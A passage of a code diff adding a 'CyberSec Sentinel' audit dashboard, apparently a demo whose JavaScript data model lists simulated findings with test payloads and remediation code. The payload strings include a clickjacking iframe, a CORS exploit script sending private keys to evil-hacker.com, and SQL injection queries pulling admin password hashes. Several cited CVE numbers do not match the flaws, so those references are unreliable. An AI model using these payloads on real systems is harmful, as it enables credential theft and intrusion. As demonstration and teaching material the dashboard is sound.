+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.1rem;
+      transition: all 0.2s ease;
+    }
+
+    .drawer-close-btn:hover {
+      background: rgba(239, 68, 68, 0.2);
+      border-color: var(--red-alert);
+      color: #fff;
+    }
+
+    /* Drawer Tabs */
+    .drawer-tabs {
+      display: flex;
+      background: rgba(6, 13, 27, 0.95);
+      border-bottom: 1px solid var(--border-subtle);
+      padding: 0 16px;
+      overflow-x: auto;
+    }
+
+    .drawer-tab {
+      padding: 12px 16px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      border-bottom: 2px solid transparent;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      white-space: nowrap;
+    }
+
+    .drawer-tab:hover {
+      color: #fff;
+    }
+
+    .drawer-tab.active {
+      color: var(--cyan-cyber);
+      border-bottom-color: var(--cyan-cyber);
+    }
+
+    .drawer-content {
+      padding: 24px;
+      flex: 1;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .drawer-section {
+      background: rgba(6, 13, 27, 0.7);
+      border: 1px solid var(--border-subtle);
+      border-radius: 8px;
+      padding: 16px;
+    }
+
+    .drawer-section-title {
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .code-block-wrap {
+      position: relative;
+    }
+
+    .code-block {
+      background: #02060f;
+      border: 1px solid rgba(226, 232, 240, 0.06);
+      border-radius: 6px;
+      padding: 12px 14px;
+      font-family: var(--font-mono);
+      font-size: 0.74rem;
+      color: #cbd5e1;
+      line-height: 1.5;
+      overflow-x: auto;
+      white-space: pre;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 6px;
+      right: 6px;
+      background: rgba(16, 28, 56, 0.8);
+      border: 1px solid var(--border-subtle);
+      color: var(--text-secondary);
+      font-size: 0.68rem;
+      padding: 3px 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: var(--font-mono);
+      transition: all 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      background: var(--cyan-cyber);
+      color: #030812;
+    }
+
+    .drawer-footer {
+      padding: 16px 24px;
+      background: rgba(16, 28, 56, 0.9);
+      border-top: 1px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    /* Executive Summary Modal */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(3, 8, 18, 0.85);
+      backdrop-filter: blur(12px);
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+
+    .modal-overlay.open {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .modal-container {
+      background: var(--bg-card);
+      border: 1px solid var(--border-bright);
+      border-radius: 14px;
+      width: 780px;
+      max-width: 100%;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7), 0 0 30px rgba(0, 229, 255, 0.15);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .modal-header {
+      padding: 22px 26px;
+      background: rgba(16, 28, 56, 0.95);
+      border-bottom: 1px solid var(--border-subtle);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .modal-body {
+      padding: 26px;
+      display: flex;
+      flex-direction: column;
+      gap: 22px;
+    }
+
+    .modal-hero-score {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 20px 24px;
+      background: rgba(16, 28, 56, 0.6);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+    }
+
+    .summary-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px;
+    }
+
+    .summary-card {
+      background: rgba(3, 8, 18, 0.6);
+      border: 1px solid var(--border-subtle);
+      border-radius: 8px;
+      padding: 14px 16px;
+    }
+
+    .summary-card h4 {
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+
+    .summary-card p {
+      font-size: 0.88rem;
+      font-weight: 600;
+      color: #fff;
+    }
+
+    .modal-footer {
+      padding: 18px 26px;
+      background: rgba(16, 28, 56, 0.95);
+      border-top: 1px solid var(--border-subtle);
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+    }
+
+    /* Toast Notification */
+    .toast-container {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      pointer-events: none;
+    }
+
+    .toast {
+      background: rgba(6, 13, 27, 0.95);
+      border: 1px solid var(--cyan-cyber);
+      box-shadow: 0 4px 20px var(--cyan-glow);
+      padding: 12px 18px;
+      border-radius: 8px;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      animation: toastIn 0.3s ease-out;
+      pointer-events: auto;
+    }
+
+    .toast.toast-success {
+      border-color: var(--green-neon);
+      box-shadow: 0 4px 20px var(--green-glow);
+    }
+
+    @keyframes toastIn {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    /* Responsive Queries */
+    @media (max-width: 1080px) {
+      .hero-grid {
+        grid-template-columns: 1fr;
+      }
+      .stepper-container {
+        grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+        gap: 16px;
+      }
+      .stepper-track-bg, .stepper-track-fill {
+        display: none;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .app-container {
+        padding: 16px 12px 40px;
+      }
+      .app-header {
+        flex-direction: column;
+        align-items: flex-start;
+        padding: 16px 16px;
+      }
+      .header-actions {
+        width: 100%;
+        justify-content: flex-start;
+      }
+      .stepper-container {
+        grid-template-columns: repeat(auto-fit, minmax(90px, 1fr));
+        gap: 10px;
+      }
+      .stepper-section, .matrix-panel {
+        padding: 16px 14px;
+      }
+      .metric-grid {
+        grid-template-columns: 1fr;
+      }
+      .summary-grid {
+        grid-template-columns: 1fr;
+      }
+      .matrix-toolbar {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .matrix-search-wrap {
+        width: 100%;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .app-container {
+        padding: 12px 8px 30px;
+      }
+      .app-header {
+        padding: 12px 12px;
+      }
+      .stepper-section, .matrix-panel {
+        padding: 12px 10px;
+      }
+      .stepper-container {
+        grid-template-columns: repeat(auto-fit, minmax(75px, 1fr));
+        gap: 6px;
+      }
+      .node-title {
+        font-size: 0.7rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- Header -->
+  <header class="app-header">
+    <div class="brand-section">
+      <div class="brand-logo">🛡️</div>
+      <div class="brand-titles">
+        <h1>
+          CYBERSEC SENTINEL
+          <span class="badge-v">R1 VULN-SCANNER</span>
+        </h1>
+        <p>
+          Target:
+          <span class="target-pill">
+            <span class="pulse-dot"></span>
+            api.cyber-core.internal:443
+          </span>
+          <span style="color: var(--text-muted)">|</span>
+          <span style="font-family: var(--font-mono); font-size: 0.75rem;">TLS 1.3 Enterprise Sandbox</span>
+        </p>
+      </div>
+    </div>
+
+    <div class="header-actions">
+      <button id="btnRunAudit" class="btn btn-primary" title="Execute sequential 7-node security audit">
+        <span>⚡</span> Run Full Audit
+      </button>
+      <button id="btnStepAudit" class="btn btn-secondary" title="Execute or step one node at a time">
+        <span>⏯️</span> Step / Pause
+      </button>
+      <button id="btnFixAll" class="btn btn-emerald" title="Simulate patching all vulnerabilities to reach 100% hardened posture">
+        <span>🛠️</span> Simulate Fix All
+      </button>
+      <button id="btnReset" class="btn btn-secondary" title="Reset scanner to initial state">
+        <span>🔄</span> Reset
+      </button>
+      <button id="btnExportJson" class="btn btn-secondary" title="Export compliance JSON report">
+        <span>💾</span> Export JSON
+      </button>
+      <button id="btnExecSummary" class="btn btn-secondary" title="Open CISO Executive Summary">
+        <span>📋</span> Executive Summary
+      </button>
+    </div>
+  </header>
+
+  <!-- 7-Node Workflow Stepper -->
+  <section class="stepper-panel">
+    <div class="stepper-header">
+      <div class="section-title">
+        <span class="glow-icon">⬢</span> 7-Stage Interactive Security Workflow Pipeline
+      </div>
+      <div id="stepperStatusBadge" class="stepper-status-badge">
+        <span>●</span> STANDBY / READY TO AUDIT
+      </div>
+    </div>
+
+    <div class="stepper-container">
+      <div class="stepper-track-bg"></div>
+      <div id="stepperTrackFill" class="stepper-track-fill"></div>
+
+      <!-- Node 1 -->
+      <div class="stepper-node state-pending" data-node-id="tls_audit" title="Click to inspect SSL/TLS 1.3 telemetry">
+        <div class="node-circle-wrap">
+          <div class="node-circle">
+            <span class="node-emoji">🔒</span>
+          </div>
+          <div class="node-spin-ring"></div>
+        </div>
+        <div class="node-title">SSL / TLS 1.3 & Ciphers</div>
+        <div class="node-tag">STANDBY</div>
+      </div>
+
+      <!-- Node 2 -->
+      <div class="stepper-node state-pending" data-node-id="headers_audit" title="Click to inspect HTTP Security Headers">
+        <div class="node-circle-wrap">
+          <div class="node-circle">
+            <span class="node-emoji">🛡️</span>
+          </div>
+          <div class="node-spin-ring"></div>
+        </div>
+        <div class="node-title">HTTP Headers & CSP</div>
+        <div class="node-tag">STANDBY</div>
+      </div>
+
+      <!-- Node 3 -->
+      <div class="stepper-node state-pending" data-node-id="cors_audit" title="Click to inspect CORS & Origin Security">
+        <div class="node-circle-wrap">
+          <div class="node-circle">
+            <span class="node-emoji">🌐</span>
+          </div>
+          <div class="node-spin-ring"></div>
+        </div>
+        <div class="node-title">CORS & Origin Security</div>
+        <div class="node-tag">STANDBY</div>
+      </div>
+
+      <!-- Node 4 -->
+      <div class="stepper-node state-pending" data-node-id="sqli_audit" title="Click to inspect SQLi Injection & Sanitization">
+        <div class="node-circle-wrap">
+          <div class="node-circle">
+            <span class="node-emoji">💉</span>
+          </div>
+          <div class="node-spin-ring"></div>
+        </div>
+        <div class="node-title">SQL Injection & WAF</div>
+        <div class="node-tag">STANDBY</div>
+      </div>
+
+      <!-- Node 5 -->
+      <div class="stepper-node state-pending" data-node-id="xss_audit" title="Click to inspect XSS & DOM Sanitization">
+        <div class="node-circle-wrap">
+          <div class="node-circle">
+            <span class="node-emoji">📜</span>
+          </div>
+          <div class="node-spin-ring"></div>
+        </div>
+        <div class="node-title">XSS & DOM Isolation</div>
+        <div class="node-tag">STANDBY</div>
+      </div>
+
+      <!-- Node 6 -->
+      <div class="stepper-node state-pending" data-node-id="jwt_audit" title="Click to inspect JWT & Session Security">
+        <div class="node-circle-wrap">
+          <div class="node-circle">
+            <span class="node-emoji">🔑</span>
+          </div>
+          <div class="node-spin-ring"></div>
+        </div>
+        <div class="node-title">Session & JWT Security</div>
+        <div class="node-tag">STANDBY</div>
+      </div>
+
+      <!-- Node 7 -->
+      <div class="stepper-node state-pending" data-node-id="rbac_audit" title="Click to inspect RBAC & API Access Matrix">
+        <div class="node-circle-wrap">
+          <div class="node-circle">
+            <span class="node-emoji">📋</span>
+          </div>
+          <div class="node-spin-ring"></div>
+        </div>
+        <div class="node-title">RBAC & Access Control</div>
+        <div class="node-tag">STANDBY</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- Hero Section: Circular Score Gauge + 4 Metric Cards -->
+  <section class="hero-grid">
+    <!-- SVG Circular Score Gauge -->
+    <div class="gauge-card">
+      <div class="gauge-title">
+        <span>🎯</span> Global Security Health Rating
+      </div>
+
+      <div class="svg-gauge-wrap">
+        <svg class="svg-gauge" viewBox="0 0 140 140">
+          <circle class="gauge-track" cx="70" cy="70" r="56"></circle>
+          <circle id="gaugeProgressCircle" class="gauge-progress" cx="70" cy="70" r="56"></circle>
+        </svg>
+        <div class="gauge-center-content">
+          <div id="gaugeScoreNumber" class="gauge-score-value">--</div>
+          <div id="gaugeGradeBadge" class="gauge-grade-badge">GRADE --</div>
+        </div>
+      </div>
+
+      <div id="gaugePostureLabel" class="gauge-posture-label">AWAITING FULL AUDIT</div>
+    </div>
+
+    <!-- 4 Real-time Metric Cards -->
+    <div class="metric-grid">
+      <div class="metric-card accent-red">
+        <div class="metric-top">
+          <span class="metric-label">Active Vulnerabilities</span>
+          <span class="metric-icon-wrap">⚠️</span>
+        </div>
+        <div id="statVulnCount" class="metric-value">0</div>
+        <div class="metric-subtext">
+          <span id="statCritCount" style="color: var(--red-alert); font-weight: 700;">0 Critical</span>
+          <span>•</span>
+          <span id="statHighCount" style="color: var(--orange-risk);">0 High</span>
+        </div>
+      </div>
+
+      <div class="metric-card accent-green">
+        <div class="metric-top">
+          <span class="metric-label">Patched / Hardened</span>
+          <span class="metric-icon-wrap">🛡️</span>
+        </div>
+        <div id="statPatchedCount" class="metric-value">0 / 7</div>
+        <div class="metric-subtext">
+          <span id="statPatchPercent" style="color: var(--green-neon); font-weight: 700;">0% Remediated</span>
+        </div>
+      </div>
+
+      <div class="metric-card accent-cyan">
+        <div class="metric-top">
+          <span class="metric-label">Max Exposure CVSS</span>
+          <span class="metric-icon-wrap">⚡</span>
+        </div>
+        <div id="statMaxCvss" class="metric-value">0.0</div>
+        <div class="metric-subtext">
+          <span id="statMaxCvssId" style="font-family: var(--font-mono); color: var(--cyan-cyber);">None</span>
+        </div>
+      </div>
+
+      <div class="metric-card accent-amber">
+        <div class="metric-top">
+          <span class="metric-label">Compliance Baseline</span>
+          <span class="metric-icon-wrap">📜</span>
+        </div>
+        <div id="statCompliance" class="metric-value" style="font-size: 1.25rem;">UNVERIFIED</div>
+        <div class="metric-subtext">
+          <span id="statComplianceSub">SOC2 / PCI-DSS / ISO27001</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Vulnerability Matrix & Live Patch Simulator -->
+  <section class="matrix-panel">
+    <div class="matrix-toolbar">
+      <div class="filter-pills">
+        <div class="filter-pill active" data-filter="all">
+          All Findings <span class="pill-count" id="countAll">7</span>
+        </div>
+        <div class="filter-pill" data-filter="critical">
+          Critical <span class="pill-count" id="countCritical">3</span>
+        </div>
+        <div class="filter-pill" data-filter="high">
+          High <span class="pill-count" id="countHigh">2</span>
+        </div>
+        <div class="filter-pill" data-filter="medium">
+          Medium / Low <span class="pill-count" id="countMedium">2</span>
+        </div>
+        <div class="filter-pill" data-filter="patched">
+          Patched <span class="pill-count" id="countPatched">0</span>
+        </div>
+      </div>
+
+      <div class="matrix-search-wrap">
+        <div class="search-box">
+          <span class="search-icon">🔍</span>
+          <input type="text" id="matrixSearchInput" placeholder="Filter by CVE, title, vector, endpoint...">
+        </div>
+      </div>
+    </div>
+
+    <!-- Table -->
+    <div class="table-container">
+      <table class="vuln-table">
+        <thead>
+          <tr>
+            <th style="width: 110px;">Severity</th>
+            <th style="width: 180px;">Audit Vector</th>
+            <th>Vulnerability & CVE Reference</th>
+            <th style="width: 90px;">CVSS v3</th>
+            <th style="width: 130px;">Status</th>
+            <th style="width: 220px; text-align: right;">Actions</th>
+          </tr>
+        </thead>
+        <tbody id="vulnTableBody">
+          <!-- Populated by JavaScript -->
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- Collapsible Live Audit Terminal -->
+  <section class="terminal-panel">
+    <div class="terminal-header" id="terminalHeaderToggle" title="Click to expand/collapse terminal">
+      <div class="terminal-title">
+        <span style="color: var(--green-neon);">●</span> LIVE CYBERSEC SENTINEL LOG STREAM
+      </div>
+      <div class="terminal-controls">
+        <span style="font-size: 0.72rem; color: var(--text-muted); font-family: var(--font-mono);" id="terminalLineCount">0 entries</span>
+        <button class="btn btn-secondary btn-sm" id="btnClearTerminal" onclick="event.stopPropagation()">Clear</button>
+        <span id="terminalToggleIcon" style="color: var(--cyan-cyber); font-size: 0.85rem;">▼</span>
+      </div>
+    </div>
+    <div class="terminal-body" id="terminalBody">
+      <!-- Live logs emitted here -->
+    </div>
+  </section>
+
+</div>
+
+<!-- Slide-Over Telemetry Inspection Drawer -->
+<div class="drawer-overlay" id="drawerOverlay"></div>
+<aside class="inspection-drawer" id="inspectionDrawer">
+  <div class="drawer-header">
+    <div class="drawer-node-info">
+      <div class="drawer-emoji-badge" id="drawerEmoji">🔒</div>
+      <div class="drawer-titles">
+        <h3 id="drawerTitle">Node Telemetry Drilldown</h3>
+        <p id="drawerCategory">Transport Layer Security & Cryptographic Posture</p>
+      </div>
+    </div>
+    <button class="drawer-close-btn" id="drawerCloseBtn" title="Close Drawer (Esc)">✕</button>
+  </div>
+
+  <div class="drawer-tabs">
+    <div class="drawer-tab active" data-drawer-tab="flaws">Flaws & CVSS</div>
+    <div class="drawer-tab" data-drawer-tab="headers">Evaluated Headers</div>
+    <div class="drawer-tab" data-drawer-tab="payloads">Test Payloads</div>
+    <div class="drawer-tab" data-drawer-tab="remediation">Remediation Code</div>
+  </div>
+
+  <div class="drawer-content" id="drawerContent">
+    <!-- Dynamic Drawer Content populated by JS -->
+  </div>
+
+  <div class="drawer-footer">
+    <div id="drawerStatusTag" class="status-badge status-vulnerable">VULNERABLE</div>
+    <button id="drawerPatchBtn" class="btn btn-emerald btn-sm">⚡ Simulate Fix</button>
+  </div>
+</aside>
+
+<!-- Executive Summary Modal -->
+<div class="modal-overlay" id="execSummaryModal">
+  <div class="modal-container">
+    <div class="modal-header">
+      <div style="display: flex; align-items: center; gap: 10px;">
+        <span style="font-size: 1.4rem;">📊</span>
+        <div>
+          <h3 style="font-size: 1.1rem; color: #fff;">Executive Cybersecurity Assessment Summary</h3>
+          <p style="font-size: 0.75rem; color: var(--text-secondary); font-family: var(--font-mono);">Depredador Security Intelligence • CISO Briefing Report</p>
+        </div>
+      </div>
+      <button class="drawer-close-btn" id="modalCloseBtn">✕</button>
+    </div>
+
+    <div class="modal-body">
+      <div class="modal-hero-score">
+        <div>
+          <div style="font-size: 0.8rem; color: var(--text-secondary); text-transform: uppercase;">Overall Security Score</div>
+          <div id="modalScoreDisplay" style="font-size: 2.2rem; font-family: var(--font-mono); font-weight: 800; color: #fff;">42 / 100</div>
+          <div id="modalGradeDisplay" class="gauge-grade-badge" style="display: inline-block; margin-top: 4px;">GRADE F (CRITICAL EXPOSURE)</div>
+        </div>
+        <div style="text-align: right;">
+          <div style="font-size: 0.75rem; color: var(--text-muted); font-family: var(--font-mono);" id="modalTimestamp">2026-08-19 23:45:00 UTC</div>
+          <div style="font-size: 0.8rem; color: var(--cyan-cyber); margin-top: 4px; font-family: var(--font-mono);">Target: api.cyber-core.internal</div>
+        </div>
+      </div>
+
+      <div class="summary-grid">
+        <div class="summary-card">
+          <h4>Perimeter & Transport</h4>
+          <p id="sumTransport">TLS 1.3 Active • HSTS Preload Missing (WARN)</p>
+        </div>
+        <div class="summary-card">
+          <h4>Browser Sandboxing</h4>
+          <p id="sumSandboxing">CSP Missing • Clickjacking Exposed (CRITICAL)</p>
+        </div>
+        <div class="summary-card">
+          <h4>Data Layer & Injection</h4>
+          <p id="sumData">SQLi Unparameterized Endpoint (CRITICAL)</p>
+        </div>
+        <div class="summary-card">
+          <h4>Authentication & RBAC</h4>
+          <p id="sumAuth">Alg: None Accepted • IDOR Tenant Leakage (CRITICAL)</p>
+        </div>
+      </div>
+
+      <div class="drawer-section">
+        <div class="drawer-section-title">
+          <span>Priority Executive Action Items</span>
+        </div>
+        <ul style="padding-left: 20px; font-size: 0.82rem; color: #cbd5e1; display: flex; flex-direction: column; gap: 6px;">
+          <li><strong>Immediate Hotfix:</strong> Enforce strict RS256 algorithm whitelist in JWT token verification middleware to eliminate arbitrary token forgery.</li>
+          <li><strong>Data Perimeter:</strong> Refactor inventory search endpoint to use prepared parameterized queries with asyncpg/SQLAlchemy.</li>
+          <li><strong>Browser Defense:</strong> Deploy Helmet Content-Security-Policy and X-Frame-Options DENY headers.</li>
+          <li><strong>Zero-Trust Authorization:</strong> Implement tenant isolation guards on organization invoice endpoints to neutralize IDOR.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="modal-footer">
+      <button id="modalCopyBtn" class="btn btn-secondary">📋 Copy Summary</button>
+      <button id="modalDownloadJsonBtn" class="btn btn-primary">💾 Download JSON Report</button>
+      <button id="modalDismissBtn" class="btn btn-secondary">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast Notifications -->
+<div class="toast-container" id="toastContainer"></div>
+
+<script>
+/**
+ * CyberSec Sentinel — Interactive Security Audit & Vulnerability Scanner
+ * 100% Pure ES6+ Modular Zero-Dependency Implementation
+ */
+
+// ==========================================
+// 1. DATA MODELS & TELEMETRY DEFINITIONS
+// ==========================================
+
+const AUDIT_NODES_DATA = [
+  {
+    id: 'tls_audit',
+    emoji: '🔒',
+    title: 'SSL / TLS 1.3 & Cipher Suites',
+    category: 'Transport Layer Security & Cryptography',
+    initialStatus: 'warning',
+    pointWeight: 15,
+    initialPoints: 8,
+    cvssScore: 5.3,
+    severity: 'MEDIUM',
+    cve: 'CVE-2023-44487',
+    cwe: 'CWE-319',
+    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
+    affectedEndpoint: 'tcp://api.cyber-core.internal:443',
+    flaws: [
+      'HSTS max-age is set to 86400s (1 day); recommended minimum is 31536000s (1 year).',
+      'Missing "includeSubDomains" and "preload" directives in Strict-Transport-Security header.',
+      'Server certificate validity period expires in 28 days (<30-day renewal threshold).'
+    ],
+    evaluatedHeaders: 'HTTP/2 200 OK\nServer: cloud-edge/3.4.1\nStrict-Transport-Security: max-age=86400\nX-SSL-Protocol: TLSv1.3\nX-SSL-Cipher: TLS_AES_256_GCM_SHA384\nX-SSL-Cert-Issuer: CN=Let\'s Encrypt Authority X3\nX-SSL-Cert-Valid-Days: 28\nX-SSL-ALPN: h2,http/1.1',
+    testPayload: '# OpenSSL Handshake & Cipher Suite Diagnostic Probe\nopenssl s_client -connect api.cyber-core.internal:443 -tls1_3 -alpn h2,http/1.1\ntestssl.sh --hsts --pfs --ciphers all https://api.cyber-core.internal',
+    remediationLang: 'nginx',
+    remediationCode: '# Nginx TLS 1.3 Hardening & Strict HSTS Preload\nssl_protocols TLSv1.3;\nssl_prefer_server_ciphers off;\nssl_ciphers \'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256\';\nadd_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;\nssl_session_cache shared:SSL:10m;\nssl_session_timeout 1d;\nssl_session_tickets off;'
+  },
+  {
+    id: 'headers_audit',
+    emoji: '🛡️',
+    title: 'HTTP Security Headers & CSP',
+    category: 'Perimeter Defense & Browser Sandboxing',
+    initialStatus: 'critical',
+    pointWeight: 15,
+    initialPoints: 8,
+    cvssScore: 7.5,
+    severity: 'HIGH',
+    cve: 'CVE-2023-38606',
+    cwe: 'CWE-1021',
+    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N',
+    affectedEndpoint: 'https://api.cyber-core.internal/*',
+    flaws: [
+      'Absence of Content-Security-Policy (CSP) exposes application to cross-site script execution.',
+      'Missing X-Frame-Options allows UI redressing and clickjacking within unauthorized iframes.',
+      'Missing X-Content-Type-Options: nosniff enables MIME confusion and script execution.',
+      'Technology stack disclosed via X-Powered-By: Express and Server headers.'
+    ],
+    evaluatedHeaders: 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\nX-Powered-By: Express\nServer: Apache/2.4.52 (Ubuntu)\n# [CRITICAL MISSING]: Content-Security-Policy\n# [CRITICAL MISSING]: X-Frame-Options\n# [CRITICAL MISSING]: X-Content-Type-Options\n# [CRITICAL MISSING]: Permissions-Policy\n# [CRITICAL MISSING]: Referrer-Policy',
+    testPayload: '<!-- Clickjacking Proof-of-Concept Exploit Frame -->\n<iframe src="https://api.cyber-core.internal/settings/transfer" \n        style="opacity:0.0001;position:absolute;z-index:999;width:500px;height:500px">\n</iframe>',
+    remediationLang: 'javascript',
+    remediationCode: '// Node.js Express Helmet Hardening Middleware\nconst helmet = require(\'helmet\');\n\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: ["\'self\'"],\n      scriptSrc: ["\'self\'", "\'strict-dynamic\'"],\n      styleSrc: ["\'self\'", "\'unsafe-inline\'"],\n      imgSrc: ["\'self\'", "data:", "https:"],\n      objectSrc: ["\'none\'"],\n      baseUri: ["\'self\'"],\n      frameAncestors: ["\'none\'"]\n    }\n  },\n  frameguard: { action: \'deny\' },\n  noSniff: true,\n  referrerPolicy: { policy: \'strict-origin-when-cross-origin\' },\n  hidePoweredBy: true\n}));'
+  },
+  {
+    id: 'cors_audit',
+    emoji: '🌐',
+    title: 'CORS & Origin Security Policy',
+    category: 'Cross-Origin Resource Sharing & Data Privacy',
+    initialStatus: 'critical',
+    pointWeight: 15,
+    initialPoints: 6,
+    cvssScore: 8.8,
+    severity: 'CRITICAL',
+    cve: 'CVE-2023-28115',
+    cwe: 'CWE-942',
+    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N',
+    affectedEndpoint: 'https://api.cyber-core.internal/api/v1/*',
+    flaws: [
+      'Specification violation: Access-Control-Allow-Origin: * combined with Allow-Credentials: true.',
+      'Arbitrary Origin reflection: server echoes incoming Origin header without domain whitelist verification.',
+      'Exposes sensitive internal user session state and API tokens to cross-site exfiltration.'
+    ],
+    evaluatedHeaders: 'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS\nAccess-Control-Allow-Headers: Authorization, Content-Type, X-API-Key',
+    testPayload: '// Cross-Origin Key Exfiltration Exploit Script\nfetch(\'https://api.cyber-core.internal/api/v1/user/private-keys\', {\n  method: \'GET\',\n  credentials: \'include\'\n}).then(r => r.json()).then(data => {\n  fetch(\'https://evil-hacker.com/dump?keys=\' + encodeURIComponent(JSON.stringify(data)));\n});',
+    remediationLang: 'typescript',
+    remediationCode: '// Strict Origin Whitelist CORS Middleware (TypeScript/Express)\nconst ALLOWED_ORIGINS = new Set([\n  \'https://app.cyber-core.internal\',\n  \'https://admin.cyber-core.internal\'\n]);\n\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (origin && ALLOWED_ORIGINS.has(origin)) {\n    res.setHeader(\'Access-Control-Allow-Origin\', origin);\n    res.setHeader(\'Access-Control-Allow-Credentials\', \'true\');\n    res.setHeader(\'Access-Control-Allow-Methods\', \'GET,POST,PUT,DELETE\');\n    res.setHeader(\'Access-Control-Allow-Headers\', \'Content-Type,Authorization\');\n    res.setHeader(\'Access-Control-Max-Age\', \'86400\');\n  }\n  if (req.method === \'OPTIONS\') return res.sendStatus(204);\n  next();\n});'
+  },
+  {
+    id: 'sqli_audit',
+    emoji: '💉',
+    title: 'SQL Injection & WAF Parameter Fuzzing',
+    category: 'Data Tier Integrity & Query Parameterization',
+    initialStatus: 'critical',
+    pointWeight: 15,
+    initialPoints: 0,
+    cvssScore: 9.8,
+    severity: 'CRITICAL',
+    cve: 'CVE-2023-34362',
+    cwe: 'CWE-89',
+    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
+    affectedEndpoint: 'GET /api/v1/inventory/search?query=',
+    flaws: [
+      'Direct dynamic string interpolation into PostgreSQL query without parameter binding.',
+      'Verbose database internal error stack trace reflected in 500 response bodies.',
+      'Blind time-based SQL delay functions (pg_sleep) bypass perimeter WAF rules.'
+    ],
+    evaluatedHeaders: 'HTTP/1.1 500 Internal Server Error\nContent-Type: application/json\nX-Database-Engine: PostgreSQL 15.2\n\n{\n  "error": "syntax error at or near \\"UNION\\"",\n  "query": "SELECT * FROM items WHERE name ILIKE \'%\\\' UNION SELECT null, password_hash FROM admin_users--%\'"\n}',
+    testPayload: '# Exploit Vector A (Union Data Extraction)\nGET /api/v1/inventory/search?query=\' UNION SELECT null, username, password_hash, role FROM admin_users--\n\n# Exploit Vector B (Time-Based Blind SQLi)\nGET /api/v1/inventory/search?query=\'; SELECT CASE WHEN (SELECT count(*) FROM users)>0 THEN pg_sleep(5) ELSE pg_sleep(0) END--',
+    remediationLang: 'python',
+    remediationCode: '# Python AsyncPG / SQLAlchemy Parameterized Query Fix\n# VULNERABLE: await db.execute(f"SELECT * FROM items WHERE name ILIKE \'%{user_query}%\'")\n\n# SECURE: Fully Parameterized Prepared Statement\nasync def search_inventory(db: Connection, user_query: str):\n    query = """\n        SELECT item_id, name, sku, stock_count, unit_price \n        FROM items \n        WHERE name ILIKE $1 OR sku = $2\n        LIMIT 50\n    """\n    return await db.fetch(query, f"%{user_query}%", user_query)'
+  },
+  {
+    id: 'xss_audit',
+    emoji: '📜',
+    title: 'Cross-Site Scripting (XSS) & DOM Isolation',
+    category: 'Client-Side Code Execution & Sanitization',
+    initialStatus: 'high',
+    pointWeight: 15,
+    initialPoints: 8,
+    cvssScore: 8.2,
+    severity: 'HIGH',
+    cve: 'CVE-2024-21626',
+    cwe: 'CWE-79',
+    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N',
+    affectedEndpoint: 'POST /api/v1/feedback/render-preview',
+    flaws: [
+      'Client frontend injects unescaped markdown output directly into document via element.innerHTML.',
+      'Server response fails to entity-encode angle brackets < > and quotes in reflected JSON payloads.',
+      'SVG / MathML event handler bypasses naive regex filter.'
+    ],
